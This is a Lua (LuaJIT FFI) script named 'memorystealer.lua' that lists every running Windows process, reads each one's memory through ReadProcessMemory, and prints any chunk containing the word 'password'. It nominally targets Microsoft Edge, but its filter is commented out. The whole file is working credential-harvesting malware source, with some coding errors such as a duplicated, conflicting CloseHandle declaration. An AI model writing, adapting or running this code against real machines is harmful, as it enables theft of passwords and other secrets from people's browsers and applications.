--[[ memorystealer.lua

Debugs every process and searches memory for the string "password"

]]--

-- load ffi
local ffi = require("ffi")

-- kernel32.dll import
local kernel32 = ffi.load("kernel32")

-- Define necessary Windows API functions and structures
ffi.cdef[[
typedef long LONG;
typedef unsigned long DWORD;
typedef void* HANDLE;
typedef unsigned short WCHAR;
typedef int BOOL;
typedef const char* LPCSTR;
typedef char* LPSTR;
typedef unsigned long DWORD;
typedef void* HANDLE;
typedef long LONG;
    
typedef struct _MEMORY_BASIC_INFORMATION {
    void* BaseAddress;
    void* AllocationBase;
    void* AllocationProtect;
    size_t RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
} MEMORY_BASIC_INFORMATION;

typedef struct {
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    HANDLE th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    char szExeFile[260];
} PROCESSENTRY32;

static const DWORD PROCESS_VM_READ = 0x0010;
static const DWORD PROCESS_QUERY_INFORMATION = 0x0400;

HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
BOOL CloseHandle(HANDLE hObject);
DWORD GetProcessId(LPCSTR lpName);
size_t VirtualQueryEx(HANDLE hProcess, void* lpAddress, MEMORY_BASIC_INFORMATION* lpBuffer, size_t dwLength);
BOOL ReadProcessMemory(HANDLE hProcess, void* lpBaseAddress, LPSTR lpBuffer, size_t nSize, size_t* lpNumberOfBytesRead);
HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
int Process32First(HANDLE hSnapshot, PROCESSENTRY32* lppe);
int Process32Next(HANDLE hSnapshot, PROCESSENTRY32* lppe);
void CloseHandle(HANDLE hObject);
DWORD GetLastError(void);
]]

-- defines
local TH32CS_SNAPPROCESS = 0x00000002
local INVALID_HANDLE_VALUE = ffi.cast("HANDLE", -1)

function searchProcess(pid)
    local hProcess = kernel32.OpenProcess(kernel32.PROCESS_VM_READ + kernel32.PROCESS_QUERY_INFORMATION, false, pid)
    if hProcess == nil then
        local errorCode = kernel32.GetLastError()
        print("Error opening process. Error code: " .. errorCode)
        return
    end

    -- Iterate over the process memory in 65535-byte increments
    local mbi = ffi.new("MEMORY_BASIC_INFORMATION")
    local address = nil
    while kernel32.VirtualQueryEx(hProcess, address, mbi, ffi.sizeof(mbi)) == ffi.sizeof(mbi) do
        -- Read the memory and search for the string 
        local increment = 65535
        local remainingSize = mbi.RegionSize
        while remainingSize > 0 do
            local bufferSize = math.min(increment, remainingSize)
            local buffer = ffi.new("char[?]", bufferSize)
            local bytesRead = ffi.new("size_t[1]")     
            if kernel32.ReadProcessMemory(hProcess, address, buffer, bufferSize, bytesRead) == 0 then
                local errorCode = kernel32.GetLastError()
                -- print("Error reading process memory. Error code: " .. errorCode)
                -- Handle the error as needed, getting partial reads here.
            else
                --print("Reading 0x" .. string.format("%p", address) .. " read: " .. string.format("%d", bytesRead[0]))
                local str = ffi.string(buffer, bytesRead[0])
                if string.find(string.lower(str), "password") then
                    print("Found 'password' at address: ", address)
                    print("String at address: ", str)
                end
            end
            address = ffi.cast("char*", address) + bufferSize
            remainingSize = remainingSize - bufferSize
        end
    end    
    -- Close the process handle
    kernel32.CloseHandle(hProcess)
end

function huntProcesses(processName,searchstr)
    local snapshot = ffi.C.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE then
        print("Error creating process snapshot.")
        return
    end
    local pe32 = ffi.new("PROCESSENTRY32")
    pe32.dwSize = ffi.sizeof("PROCESSENTRY32")
    if ffi.C.Process32First(snapshot, pe32) ~= 0 then
        repeat
            print("Process ID: " .. pe32.th32ProcessID .. ", Name: " .. ffi.string(pe32.szExeFile))
            --if ffi.string(pe32.szExeFile) == processName then
            -- FAFO, "password" to "searchstr" and search only certain processes.
                searchProcess(pe32.th32ProcessID,"password")
            --end
        until ffi.C.Process32Next(snapshot, pe32) == 0
    end
    ffi.C.CloseHandle(snapshot)
end

huntProcesses("msedge.exe","password")